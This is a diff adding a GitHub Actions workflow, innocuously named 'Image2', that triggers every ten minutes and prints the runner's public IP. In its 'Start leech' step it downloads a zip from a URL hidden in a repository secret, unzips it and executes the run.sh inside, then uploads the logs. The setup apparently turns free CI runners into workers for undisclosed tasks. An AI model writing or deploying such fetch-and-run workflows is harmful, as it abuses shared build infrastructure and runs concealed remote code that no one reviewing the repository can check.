@@ -1,0 +1,38 @@
+name: Image2
+on:
+  push:
+    branches: [ master ]
+  schedule:
+   - cron: "2,12,22,32,42,52 * * * *"
+  workflow_dispatch:
+ 
+#xxx
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:      
+     - name: Get IP
+       run: |
+          echo Get Ip Address
+          curl -i  https://ipinfo.io/json
+         
+             
+     - name: Start leech
+       env:
+          url: ${{ secrets.url }}
+       run: |         
+          echo Download dll
+          wget --output-document=netdll.zip $url 
+          echo unzip
+          unzip netdll.zip -d netdll
+          sudo chmod -R +X netdll 
+          cd netdll
+          echo run.sh
+          chmod +x run.sh
+          ./run.sh
+                  
+     - name: Upload log
+       uses: actions/upload-artifact@v2
+       with:
+          name: artifact-log
+          path: netdll/logs
